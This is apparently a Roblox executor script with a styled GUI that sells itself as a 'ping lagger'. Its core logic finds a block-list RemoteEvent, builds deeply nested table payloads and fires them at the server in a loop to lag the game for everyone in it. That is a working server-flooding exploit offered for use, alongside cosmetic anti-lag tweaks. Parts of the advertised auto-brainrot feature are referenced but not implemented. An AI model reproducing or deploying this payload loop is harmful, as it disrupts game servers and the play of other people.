-- Onyx Ping Lagger + Auto Brainrot
-- PC + Controller keybind | Customizable | Auto-save | Auto Brainrot Detection

local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local HttpService      = game:GetService("HttpService")
local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService") -- new

-- ══════════════════════════════════════════════════════════════════════
-- AUTO ANTI-LAG / AGGRESSIVE PERFORMANCE MODE
-- No GUI / no toggle. Starts immediately and stays client-side.
-- ══════════════════════════════════════════════════════════════════════
local function antiLagObject(obj)
    if not obj or not obj.Parent then return end
    pcall(function()
        if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
            or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
            obj.Enabled = false
            if obj:IsA("ParticleEmitter") then
                obj.Rate = 0
                obj.Lifetime = NumberRange.new(0, 0)
            end
        elseif obj:IsA("PostEffect") then
            obj.Enabled = false
        elseif obj:IsA("BasePart") then
            obj.CastShadow = false
            obj.Reflectance = 0
            -- Lower rendering cost without making parts invisible.
            if obj:IsA("MeshPart") then
                pcall(function() obj.RenderFidelity = Enum.RenderFidelity.Performance end)
            end
        elseif obj:IsA("SurfaceAppearance") then
            -- SurfaceAppearance is one of the heavier client-side visual features.
            obj:Destroy()
        elseif obj:IsA("Decal") or obj:IsA("Texture") then
            -- Keep the instance for scripts that expect it, but remove its render cost.
            obj.Transparency = 1
        end
    end)
end

-- Terrain / water rendering reductions.
pcall(function()
    local terrain = workspace:FindFirstChildOfClass("Terrain")
    if terrain then
        terrain.WaterWaveSize = 0
        terrain.WaterWaveSpeed = 0
        terrain.WaterReflectance = 0
        terrain.WaterTransparency = 1
        pcall(function() terrain.Decoration = false end)
    end
end)

-- Lighting reductions. These are client-side visual changes only.
pcall(function()
    local Lighting = game:GetService("Lighting")
    Lighting.GlobalShadows = false
    Lighting.EnvironmentDiffuseScale = 0
    Lighting.EnvironmentSpecularScale = 0
    for _, child in ipairs(Lighting:GetChildren()) do
        antiLagObject(child)
    end
end)

-- Apply to the current world once.
for _, obj in ipairs(game:GetDescendants()) do
    antiLagObject(obj)
end

-- Newly-created effects are handled immediately without a permanent heavy scan.
game.DescendantAdded:Connect(function(obj)
    task.defer(antiLagObject, obj)
end)

-- Small periodic cleanup catches effects whose properties are re-enabled by the game.
task.spawn(function()
    while task.wait(3) do
        pcall(function()
            for _, obj in ipairs(workspace:GetDescendants()) do
                if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
                    or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles")
                    or obj:IsA("PostEffect") then
                    antiLagObject(obj)
                elseif obj:IsA("BasePart") then
                    obj.CastShadow = false
                    obj.Reflectance = 0
                end
            end
        end)
    end
end)

local plr              = Players.LocalPlayer
local plrGui           = plr:WaitForChild("PlayerGui")

-- ══════════════════════════════════════════════════════════════════════
-- CONFIG & SAVE
-- ══════════════════════════════════════════════════════════════════════
local CONFIG_FILE = "OnyxPingLagger_Config.json"

local DEFAULT_CFG = {
    power         = 100000,
    interval      = 0.125,
    keybindKb     = "F",
    keybindGp     = "ButtonR2",
    autoBrainrot  = true,   -- new
    guiScale      = 65,
}

local cfg = {
    power         = DEFAULT_CFG.power,
    interval      = DEFAULT_CFG.interval,
    keybindKb     = DEFAULT_CFG.keybindKb,
    keybindGp     = DEFAULT_CFG.keybindGp,
    autoBrainrot  = DEFAULT_CFG.autoBrainrot,
    guiScale      = DEFAULT_CFG.guiScale,
}

local function resolveKb(name)
    if not name or name == "" or name == "None" then return nil end
    local ok, val = pcall(function() return Enum.KeyCode[name] end)
    return (ok and val) or nil
end

local function saveConfig()
    local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
    if ok and encoded and writefile then
        pcall(writefile, CONFIG_FILE, encoded)
    end
end

local function loadConfig()
    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
    if not ok or type(data) ~= "table" then return end

    cfg.power         = tonumber(data.power) or DEFAULT_CFG.power
    cfg.interval      = tonumber(data.interval) or DEFAULT_CFG.interval
    cfg.keybindKb     = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
    cfg.keybindGp     = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
    cfg.autoBrainrot  = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
    cfg.guiScale      = math.clamp(tonumber(data.guiScale) or DEFAULT_CFG.guiScale, 50, 120)
end

loadConfig()
-- Always start the GUI at scale 65 as requested.
cfg.guiScale = 65

local active           = false
local listeningFor     = nil
local remote           = nil
local brainrotMode     = false
-- ══════════════════════════════════════════════════════════════════════
-- ONYX.VS GUI
-- ══════════════════════════════════════════════════════════════════════

local C = {
    bg      = Color3.fromRGB(105, 0, 0),
    panel   = Color3.fromRGB(18, 18, 18),
    card    = Color3.fromRGB(12, 12, 12),
    red     = Color3.fromRGB(150, 0, 0),
    red2    = Color3.fromRGB(90, 0, 0),
    white   = Color3.fromRGB(245, 245, 245),
    gray    = Color3.fromRGB(175, 175, 175),
    green   = Color3.fromRGB(120, 255, 160),
    yellow  = Color3.fromRGB(255, 220, 60),
    waiting = Color3.fromRGB(255, 210, 90),
}

local T = {
    bg   = 0.12,
    card = 0.16,
    input = 0.04,
}

local function tw(obj, props, t)
    TweenService:Create(obj,
        TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        props):Play()
end

local function makeDraggable(frame)
    local dragging, dragStart, startPos
    frame.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1
        or i.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = i.Position
            startPos = frame.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    frame.InputChanged:Connect(function(i)
        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement
                      or i.UserInputType == Enum.UserInputType.Touch) then
            local d = i.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + d.X,
                startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
end

local function isGamepad(kc)
    local n = kc.Name
    return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick"
        or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
end

local BLACKLISTED = {
    [Enum.KeyCode.Escape]      = true,
    [Enum.KeyCode.LeftControl] = true,
    [Enum.KeyCode.Unknown]     = true,
}

-- Destroy old Onyx GUI
for _, kid in pairs(plrGui:GetChildren()) do
    if kid.Name == "OnyxPingLaggerGui" or kid.Name:find("PingLaggerGui") then
        kid:Destroy()
    end
end

local screen = Instance.new("ScreenGui")
screen.Name         = "OnyxPingLaggerGui"
screen.ResetOnSpawn = false
screen.DisplayOrder = 15
screen.IgnoreGuiInset = true
screen.Parent       = plrGui

-- Target design is based on the supplied reference: a large square,
-- dark-red transparent shell with black cards and thin white outlines.
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 1160, 0, 1160)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.BackgroundColor3 = C.bg
mainFrame.BackgroundTransparency = T.bg
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.ClipsDescendants = true
mainFrame.Parent = screen
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 22)

local mainStroke = Instance.new("UIStroke", mainFrame)
mainStroke.Color = C.white
mainStroke.Thickness = 2
mainStroke.Transparency = 0.18

local uiScale = Instance.new("UIScale", mainFrame)
local function getViewportScale()
    local cam = workspace.CurrentCamera
    if not cam then return 0.5 end
    local v = cam.ViewportSize
    return math.clamp(math.min(v.X / 1240, v.Y / 1240), 0.36, 1.0)
end

local function applyGuiScale()
    uiScale.Scale = getViewportScale() * ((cfg.guiScale or 65) / 90) * 0.45
end

makeDraggable(mainFrame)

-- Background image layer
local bgLayer = Instance.new("Frame", mainFrame)
bgLayer.Name = "BackgroundLayer"
bgLayer.Size = UDim2.new(1,0,1,0)
bgLayer.BackgroundColor3 = Color3.fromRGB(20,0,0)
bgLayer.BackgroundTransparency = 0.18
bgLayer.BorderSizePixel = 0
bgLayer.ZIndex = 0

local backgroundImages = {
    "rbxassetid://97567441696923",
    "rbxassetid://102978281088119",
    "rbxassetid://85375552380415",
    "rbxassetid://74946480483943",
}
local backgroundIndex = 1

local backgroundImage = Instance.new("ImageLabel", mainFrame)
backgroundImage.Name = "BackgroundImage"
backgroundImage.Size = UDim2.new(1,0,1,0)
backgroundImage.Position = UDim2.new(0,0,0,0)
backgroundImage.BackgroundTransparency = 1
backgroundImage.BorderSizePixel = 0
backgroundImage.Image = backgroundImages[backgroundIndex]
backgroundImage.ImageTransparency = 0.38
backgroundImage.ScaleType = Enum.ScaleType.Crop
backgroundImage.ZIndex = 1
Instance.new("UICorner", backgroundImage).CornerRadius = UDim.new(0,22)

-- Header
local header = Instance.new("Frame", mainFrame)
header.Size = UDim2.new(1,-48,0,112)
header.Position = UDim2.new(0,24,0,22)
header.BackgroundColor3 = C.red
header.BackgroundTransparency = 0.18
header.BorderSizePixel = 0
header.ZIndex = 2
Instance.new("UICorner", header).CornerRadius = UDim.new(0,18)

local headerStroke = Instance.new("UIStroke", header)
headerStroke.Color = C.white
headerStroke.Thickness = 1.4
headerStroke.Transparency = 0.45

local backgroundBtn = Instance.new("TextButton", header)
backgroundBtn.Size = UDim2.new(0,250,0,62)
backgroundBtn.Position = UDim2.new(0,28,0.5,-31)
backgroundBtn.BackgroundColor3 = C.card
backgroundBtn.BackgroundTransparency = 0.08
backgroundBtn.BorderSizePixel = 0
backgroundBtn.AutoButtonColor = false
backgroundBtn.Text = "BACKGROUND"
backgroundBtn.TextColor3 = C.white
backgroundBtn.Font = Enum.Font.GothamBlack
backgroundBtn.TextSize = 25
backgroundBtn.ZIndex = 4
Instance.new("UICorner", backgroundBtn).CornerRadius = UDim.new(0,15)

local bgStroke = Instance.new("UIStroke", backgroundBtn)
bgStroke.Color = C.white
bgStroke.Thickness = 1
bgStroke.Transparency = 0.7

local titleLbl = Instance.new("TextLabel", header)
titleLbl.Size = UDim2.new(1,-420,1,0)
titleLbl.Position = UDim2.new(0,300,0,0)
titleLbl.BackgroundTransparency = 1
titleLbl.Text = "Onyx.VS Ping Lagger"
titleLbl.TextColor3 = C.white
titleLbl.Font = Enum.Font.GothamBlack
titleLbl.TextSize = 40
titleLbl.TextXAlignment = Enum.TextXAlignment.Center
titleLbl.ZIndex = 4

local minimizeBtn = Instance.new("TextButton", header)
minimizeBtn.Size = UDim2.new(0,62,0,62)
minimizeBtn.Position = UDim2.new(1,-90,0.5,-31)
minimizeBtn.BackgroundColor3 = C.card
minimizeBtn.BackgroundTransparency = 0.08
minimizeBtn.BorderSizePixel = 0
minimizeBtn.AutoButtonColor = false
minimizeBtn.Text = "+"
minimizeBtn.TextColor3 = C.white
minimizeBtn.Font = Enum.Font.GothamBlack
minimizeBtn.TextSize = 30
minimizeBtn.ZIndex = 4
Instance.new("UICorner", minimizeBtn).CornerRadius = UDim.new(0,15)

-- Compact ACTIVE / DEACTIVE status, matching the reference style.
local compactStatus = Instance.new("TextLabel", header)
compactStatus.Name = "CompactStatus"
compactStatus.Size = UDim2.new(0,120,0,32)
compactStatus.Position = UDim2.new(1,-225,0.5,-16)
compactStatus.BackgroundTransparency = 1
compactStatus.Text = "DEACTIVE"
compactStatus.TextColor3 = C.white
compactStatus.Font = Enum.Font.GothamBlack
compactStatus.TextSize = 15
compactStatus.TextXAlignment = Enum.TextXAlignment.Center
compactStatus.ZIndex = 5

-- Main activate button
local activateBtn = Instance.new("TextButton", mainFrame)
activateBtn.Size = UDim2.new(1,-48,0,112)
activateBtn.Position = UDim2.new(0,24,0,154)
activateBtn.BackgroundColor3 = C.card
activateBtn.BackgroundTransparency = 0.06
activateBtn.BorderSizePixel = 0
activateBtn.AutoButtonColor = false
activateBtn.Text = ""
activateBtn.ZIndex = 3
Instance.new("UICorner", activateBtn).CornerRadius = UDim.new(0,22)

local activateStroke = Instance.new("UIStroke", activateBtn)
activateStroke.Color = C.white
activateStroke.Thickness = 1.5
activateStroke.Transparency = 0.55

local activateGrad = Instance.new("UIGradient", activateBtn)
activateGrad.Color = ColorSequence.new(C.card, C.card)
activateGrad.Rotation = 90

local activateLbl = Instance.new("TextLabel", activateBtn)
activateLbl.Size = UDim2.new(1,0,1,0)
activateLbl.BackgroundTransparency = 1
activateLbl.Text = "ACTIVATE"
activateLbl.TextColor3 = C.white
activateLbl.Font = Enum.Font.GothamBlack
activateLbl.TextSize = 42
activateLbl.ZIndex = 5

-- Two-column settings cards
local contentY = 286
local leftX = 24
local rightX = 624
local colW = 512
local rowH = 110
local gap = 12

local function makeCard(x, y, w, h)
    local row = Instance.new("Frame", mainFrame)
    row.Size = UDim2.new(0,w,0,h)
    row.Position = UDim2.new(0,x,0,y)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = 0.18
    row.BorderSizePixel = 0
    row.ZIndex = 3
    Instance.new("UICorner", row).CornerRadius = UDim.new(0,22)
    local stroke = Instance.new("UIStroke", row)
    stroke.Color = C.white
    stroke.Thickness = 1.6
    stroke.Transparency = 0.55
    return row
end

local function addLabel(parent, text, x, size)
    local lbl = Instance.new("TextLabel", parent)
    lbl.Size = UDim2.new(0,220,1,0)
    lbl.Position = UDim2.new(0,x or 30,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text = text
    lbl.TextColor3 = C.white
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = size or 25
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 5
    return lbl
end

local powerRow = makeCard(leftX, contentY, colW, rowH)
addLabel(powerRow, "Power", 30, 26)

local powerBox = Instance.new("TextBox", powerRow)
powerBox.Size = UDim2.new(0,240,0,72)
powerBox.Position = UDim2.new(1,-270,0.5,-36)
powerBox.BackgroundColor3 = Color3.fromRGB(4,4,4)
powerBox.BackgroundTransparency = 0.05
powerBox.BorderSizePixel = 0
powerBox.Text = tostring(cfg.power)
powerBox.TextColor3 = C.white
powerBox.Font = Enum.Font.GothamBold
powerBox.TextSize = 25
powerBox.ClearTextOnFocus = false
powerBox.ZIndex = 6
Instance.new("UICorner", powerBox).CornerRadius = UDim.new(0,15)

-- Gui Scale control, placed below the main left cards
local scaleRow = makeCard(leftX, contentY + rowH + gap, colW, rowH)
addLabel(scaleRow, "Gui Scale", 30, 25)

local scaleValueLbl = Instance.new("TextLabel", scaleRow)
scaleValueLbl.Size = UDim2.new(0,110,0,72)
scaleValueLbl.Position = UDim2.new(0.5,-55,0.5,-36)
scaleValueLbl.BackgroundColor3 = Color3.fromRGB(4,4,4)
scaleValueLbl.BackgroundTransparency = 0.05
scaleValueLbl.BorderSizePixel = 0
scaleValueLbl.Text = tostring(cfg.guiScale or 65)
scaleValueLbl.TextColor3 = C.white
scaleValueLbl.Font = Enum.Font.GothamBold
scaleValueLbl.TextSize = 24
scaleValueLbl.ZIndex = 6
Instance.new("UICorner", scaleValueLbl).CornerRadius = UDim.new(0,15)

local scalePlus = Instance.new("TextButton", scaleRow)
scalePlus.Size = UDim2.new(0,72,0,72)
scalePlus.Position = UDim2.new(1,-165,0.5,-36)
scalePlus.BackgroundColor3 = Color3.fromRGB(4,4,4)
scalePlus.BorderSizePixel = 0
scalePlus.AutoButtonColor = false
scalePlus.Text = "+"
scalePlus.TextColor3 = C.white
scalePlus.Font = Enum.Font.GothamBlack
scalePlus.TextSize = 32
scalePlus.ZIndex = 6
Instance.new("UICorner", scalePlus).CornerRadius = UDim.new(0,15)

local scaleMinus = Instance.new("TextButton", scaleRow)
scaleMinus.Size = UDim2.new(0,72,0,72)
scaleMinus.Position = UDim2.new(1,-82,0.5,-36)
scaleMinus.BackgroundColor3 = Color3.fromRGB(4,4,4)
scaleMinus.BorderSizePixel = 0
scaleMinus.AutoButtonColor = false
scaleMinus.Text = "-"
scaleMinus.TextColor3 = C.white
scaleMinus.Font = Enum.Font.GothamBlack
scaleMinus.TextSize = 32
scaleMinus.ZIndex = 6
Instance.new("UICorner", scaleMinus).CornerRadius = UDim.new(0,15)


local delayRow = makeCard(leftX, contentY + (rowH+gap)*2, colW, rowH)
addLabel(delayRow, "Delay (secs)", 30, 25)

local intervalBox = Instance.new("TextBox", delayRow)
intervalBox.Size = UDim2.new(0,240,0,72)
intervalBox.Position = UDim2.new(1,-270,0.5,-36)
intervalBox.BackgroundColor3 = Color3.fromRGB(4,4,4)
intervalBox.BackgroundTransparency = 0.05
intervalBox.BorderSizePixel = 0
intervalBox.Text = tostring(cfg.interval)
intervalBox.TextColor3 = C.white
intervalBox.Font = Enum.Font.GothamBold
intervalBox.TextSize = 25
intervalBox.ClearTextOnFocus = false
intervalBox.ZIndex = 6
Instance.new("UICorner", intervalBox).CornerRadius = UDim.new(0,15)

local brainRow = makeCard(leftX, contentY + (rowH+gap)*3, colW, rowH)
addLabel(brainRow, "Auto Brainrot", 30, 25)

local autoBrainrotBtn = Instance.new("TextButton", brainRow)
autoBrainrotBtn.Size = UDim2.new(0,190,0,72)
autoBrainrotBtn.Position = UDim2.new(1,-220,0.5,-36)
autoBrainrotBtn.BackgroundColor3 = cfg.autoBrainrot and C.white or C.card
autoBrainrotBtn.BorderSizePixel = 0
autoBrainrotBtn.AutoButtonColor = false
autoBrainrotBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
autoBrainrotBtn.TextColor3 = cfg.autoBrainrot and Color3.fromRGB(0,0,0) or C.white
autoBrainrotBtn.Font = Enum.Font.GothamBlack
autoBrainrotBtn.TextSize = 24
autoBrainrotBtn.ZIndex = 6
Instance.new("UICorner", autoBrainrotBtn).CornerRadius = UDim.new(0,15)

local kbRow = makeCard(leftX, contentY + (rowH+gap)*4, colW, rowH)
addLabel(kbRow, "Keyboard Bind", 30, 25)

local kbBindBtn = Instance.new("TextButton", kbRow)
kbBindBtn.Size = UDim2.new(0,190,0,72)
kbBindBtn.Position = UDim2.new(1,-220,0.5,-36)
kbBindBtn.BackgroundColor3 = Color3.fromRGB(4,4,4)
kbBindBtn.BackgroundTransparency = 0.04
kbBindBtn.BorderSizePixel = 0
kbBindBtn.AutoButtonColor = false
kbBindBtn.Text = cfg.keybindKb
kbBindBtn.TextColor3 = C.white
kbBindBtn.Font = Enum.Font.GothamBold
kbBindBtn.TextSize = 25
kbBindBtn.ZIndex = 6
Instance.new("UICorner", kbBindBtn).CornerRadius = UDim.new(0,15)

local gpRow = makeCard(leftX, contentY + (rowH+gap)*5, colW, rowH)
addLabel(gpRow, "Controller Bind", 30, 24)

local gpBindBtn = Instance.new("TextButton", gpRow)
gpBindBtn.Size = UDim2.new(0,190,0,72)
gpBindBtn.Position = UDim2.new(1,-220,0.5,-36)
gpBindBtn.BackgroundColor3 = Color3.fromRGB(4,4,4)
gpBindBtn.BackgroundTransparency = 0.04
gpBindBtn.BorderSizePixel = 0
gpBindBtn.AutoButtonColor = false
gpBindBtn.Text = cfg.keybindGp
gpBindBtn.TextColor3 = C.white
gpBindBtn.Font = Enum.Font.GothamBold
gpBindBtn.TextSize = 21
gpBindBtn.ZIndex = 6
Instance.new("UICorner", gpBindBtn).CornerRadius = UDim.new(0,15)

-- Right-side live status cards
local fpsRow = makeCard(rightX, contentY, colW, 245)
addLabel(fpsRow, "FPS", 0, 30).Position = UDim2.new(0,0,0,34)
local fpsLbl = fpsRow:FindFirstChildOfClass("TextLabel")
fpsLbl.Size = UDim2.new(1,0,0,50)
fpsLbl.TextXAlignment = Enum.TextXAlignment.Center
fpsLbl.TextSize = 56

local fpsValue = Instance.new("TextLabel", fpsRow)
fpsValue.Size = UDim2.new(1,0,0,105)
fpsValue.Position = UDim2.new(0,0,0.5,-10)
fpsValue.BackgroundTransparency = 1
fpsValue.Text = "0"
fpsValue.TextColor3 = C.white
fpsValue.Font = Enum.Font.GothamBlack
fpsValue.TextSize = 66
fpsValue.ZIndex = 5

local pingRow = makeCard(rightX, contentY + 257, colW, 245)
addLabel(pingRow, "PING", 0, 30).Position = UDim2.new(0,0,0,34)
local pingTitle = pingRow:FindFirstChildOfClass("TextLabel")
pingTitle.Size = UDim2.new(1,0,0,50)
pingTitle.TextXAlignment = Enum.TextXAlignment.Center
pingTitle.TextSize = 56

local pingLbl = Instance.new("TextLabel", pingRow)
pingLbl.Size = UDim2.new(1,0,0,105)
pingLbl.Position = UDim2.new(0,0,0.5,-10)
pingLbl.BackgroundTransparency = 1
pingLbl.Text = "0 ms"
pingLbl.TextColor3 = C.white
pingLbl.Font = Enum.Font.GothamBlack
pingLbl.TextSize = 58
pingLbl.ZIndex = 5

-- Small footer marker to match the reference
local footerMark = Instance.new("TextLabel", mainFrame)
footerMark.Size = UDim2.new(0,60,0,40)
footerMark.Position = UDim2.new(0,245,1,-54)
footerMark.BackgroundTransparency = 1
footerMark.Text = "▲"
footerMark.TextColor3 = C.white
footerMark.TextTransparency = 0.35
footerMark.Font = Enum.Font.GothamBlack
footerMark.TextSize = 24
footerMark.ZIndex = 5

-- The reference starts in compact mode. The settings surface is revealed
-- when the top-right + button is pressed.
local settingsParts = {
    powerRow, scaleRow, delayRow, brainRow, kbRow, gpRow,
    fpsRow, pingRow, footerMark
}
local settingsShown = false
local FULL_SIZE = UDim2.new(0, 1160, 0, 1160)
local COMPACT_SIZE = UDim2.new(0, 1160, 0, 320)
local CENTER_POS = UDim2.new(0.5, 0, 0.5, 0)
local FULL_POS = CENTER_POS
local COMPACT_POS = CENTER_POS

local function setSettingsPartsVisible(state)
    for _, obj in ipairs(settingsParts) do
        if obj then obj.Visible = state end
    end
end

setSettingsPartsVisible(false)
activateBtn.Visible = true
compactStatus.Visible = true
mainFrame.Size = COMPACT_SIZE
mainFrame.Position = COMPACT_POS


-- Compatibility aliases for the original settings system.
local settingsFrame = mainFrame
local settingsEmojiBtn = minimizeBtn
local setCloseBtn = minimizeBtn
local settingsOpen = true

local function updateKbLabels()
    if kbBindBtn then
        if listeningFor == "kb" then
            kbBindBtn.Text = "Press a key..."
            kbBindBtn.TextColor3 = C.waiting
        else
            kbBindBtn.Text = cfg.keybindKb ~= "" and cfg.keybindKb or "None"
            kbBindBtn.TextColor3 = C.white
        end
    end
    if gpBindBtn then
        if listeningFor == "gp" then
            gpBindBtn.Text = "Press a button..."
            gpBindBtn.TextColor3 = C.waiting
        else
            gpBindBtn.Text = cfg.keybindGp ~= "" and cfg.keybindGp or "None"
            gpBindBtn.TextColor3 = C.white
        end
    end
end

powerBox.FocusLost:Connect(function()
    local n = tonumber(powerBox.Text)
    if n then
        cfg.power = math.max(1, n)
        powerBox.Text = tostring(cfg.power)
        saveConfig()
    else
        powerBox.Text = tostring(cfg.power)
    end
end)

intervalBox.FocusLost:Connect(function()
    local n = tonumber(intervalBox.Text)
    if n then
        cfg.interval = math.max(0.01, n)
        intervalBox.Text = tostring(cfg.interval)
        saveConfig()
    else
        intervalBox.Text = tostring(cfg.interval)
    end
end)

autoBrainrotBtn.MouseButton1Click:Connect(function()
    cfg.autoBrainrot = not cfg.autoBrainrot
    autoBrainrotBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
    autoBrainrotBtn.BackgroundColor3 = cfg.autoBrainrot and C.white or C.card
    autoBrainrotBtn.TextColor3 = cfg.autoBrainrot and Color3.fromRGB(0,0,0) or C.white
    saveConfig()
end)

local listeningButtonState = function()
    updateKbLabels()
end

kbBindBtn.MouseButton1Click:Connect(function()
    listeningFor = (listeningFor == "kb") and nil or "kb"
    updateKbLabels()
end)

gpBindBtn.MouseButton1Click:Connect(function()
    listeningFor = (listeningFor == "gp") and nil or "gp"
    updateKbLabels()
end)

backgroundBtn.MouseButton1Click:Connect(function()
    backgroundIndex = backgroundIndex + 1
    if backgroundIndex > #backgroundImages then
        backgroundIndex = 1
    end

    backgroundImage.Image = backgroundImages[backgroundIndex]
    backgroundImage.ImageTransparency = 0.38
    backgroundBtn.TextColor3 = C.white
end)

local function setGuiScale(value)
    cfg.guiScale = math.clamp(math.floor(value + 0.5), 50, 120)
    scaleValueLbl.Text = tostring(cfg.guiScale)
    applyGuiScale()
    saveConfig()
end

scalePlus.MouseButton1Click:Connect(function()
    setGuiScale((cfg.guiScale or 65) + 5)
end)

scaleMinus.MouseButton1Click:Connect(function()
    setGuiScale((cfg.guiScale or 65) - 5)
end)

-- + opens the complete settings area and cycles the background image.
minimizeBtn.MouseButton1Click:Connect(function()
    backgroundIndex = backgroundIndex + 1
    if backgroundIndex > #backgroundImages then
        backgroundIndex = 1
    end
    backgroundImage.Image = backgroundImages[backgroundIndex]
    backgroundImage.ImageTransparency = 0.38

    settingsShown = not settingsShown
    if settingsShown then
        setSettingsPartsVisible(true)
        minimizeBtn.Text = "-"
        tw(mainFrame, {Size = FULL_SIZE, Position = FULL_POS}, 0.22)
    else
        setSettingsPartsVisible(false)
        minimizeBtn.Text = "+"
        tw(mainFrame, {Size = COMPACT_SIZE, Position = COMPACT_POS}, 0.22)
    end
    task.delay(0.24, applyGuiScale)
end)

local function openSettings()
    settingsOpen = true
    mainFrame.Visible = true
    applyGuiScale()
    powerBox.Text = tostring(cfg.power)
    intervalBox.Text = tostring(cfg.interval)
    scaleValueLbl.Text = tostring(cfg.guiScale or 65)
    updateKbLabels()
end

local function closeSettings()
    settingsOpen = false
    listeningFor = nil
    updateKbLabels()
    mainFrame.Visible = false
end

-- Keep the original names available for the lagger logic.
local statusPill = Instance.new("Frame", header)
statusPill.Size = UDim2.new(0,110,0,36)
statusPill.Position = UDim2.new(1,-175,0.5,-18)
statusPill.BackgroundTransparency = 1
statusPill.Visible = false
statusPill.BorderSizePixel = 0
statusPill.ZIndex = 3

local statusLbl = Instance.new("TextLabel", statusPill)
statusLbl.Size = UDim2.new(1,0,1,0)
statusLbl.BackgroundTransparency = 1
statusLbl.Text = "OFF"
statusLbl.TextColor3 = C.red
statusLbl.Font = Enum.Font.GothamBlack
statusLbl.TextSize = 18
statusLbl.ZIndex = 4

-- Live FPS / ping updater
local fpsAccum = 0
local fpsFrames = 0
RunService.RenderStepped:Connect(function(dt)
    fpsAccum += dt
    fpsFrames += 1
    if fpsAccum >= 0.5 then
        local fps = math.floor(fpsFrames / fpsAccum + 0.5)
        fpsValue.Text = tostring(fps)
        fpsAccum = 0
        fpsFrames = 0

        local ping = "0"
        pcall(function()
            local item = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]
            ping = tostring(math.floor(item:GetValue()))
        end)
        pingLbl.Text = ping .. " ms"
    end
end)

applyGuiScale()
updateKbLabels()

-- The reference has no separate settings window, so the main panel is
-- the settings surface itself.
-- PING LAGGER LOGIC
-- ══════════════════════════════════════════════════════════════════════

local function findRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local remote
    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then remote = r break end
    end
    if not remote then
        for _, c in ipairs(rrs:GetChildren()) do
            if c:IsA("RemoteEvent") and c.Name:find("Block") then remote = c break end
        end
    end
    return remote
end

remote = findRemote()

local function buildPayload(power)
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(power / 188), 10000)
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

local function runPingLoop()
    local delay = cfg.interval
    while active and remote do
        local payload = buildPayload(cfg.power)
        local ok = pcall(function() remote:FireServer(payload) end)
        if not ok then
            delay = math.min(delay * 1.5, 0.5)
        else
            delay = math.max(delay * 0.995, 0.05)
        end
        task.wait(delay)
    end
end

local function flipLag(state, isManual)
    active = state

    if isManual then
        if brainrotMode then
            manualOverride = not state
        else
            manualOverride = false
        end
    end

    if active then
        if not remote then
            remote = findRemote()
            if not remote then
                active = false
                flipLag(false)
                return
            end
        end
        activateGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0,C.red2),
            ColorSequenceKeypoint.new(1,C.white),
        })
        activateLbl.Text            = "ACTIVE"
        compactStatus.Text         = "ACTIVE"
        activateStroke.Color        = C.white
        activateStroke.Transparency = 0
        statusLbl.Text              = "ON"
        statusLbl.TextColor3        = C.green
        tw(statusPill, {BackgroundColor3=Color3.fromRGB(10,40,20)}, 0.2)
        mainStroke.Color            = C.green
        mainStroke.Transparency     = 0.1
        task.spawn(runPingLoop)
    else
        activateGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0,C.red),
            ColorSequenceKeypoint.new(1,C.red2),
        })
        activateLbl.Text            = "ACTIVATE"
        compactStatus.Text         = "DEACTIVE"
        activateStroke.Color        = C.white
        activateStroke.Transparency = 0.4
        statusLbl.Text              = "OFF"
        statusLbl.TextColor3        = C.red
        tw(statusPill, {BackgroundColor3=Color3.fromRGB(40,10,60)}, 0.2)
        mainStroke.Color            = C.red
        mainStroke.Transparency     = 0.35
    end
end

-- Button click: always works, tracked as manual
activateBtn.MouseButton1Click:Connect(function()
    flipLag(not active, true)
end)
activateBtn.MouseEnter:Connect(function()
    if not active then tw(activateBtn,{BackgroundColor3=Color3.fromRGB(90,30,150)},0.1) end
end)
activateBtn.MouseLeave:Connect(function()
    if not active then tw(activateBtn,{BackgroundColor3=C.card},0.1) end
end)

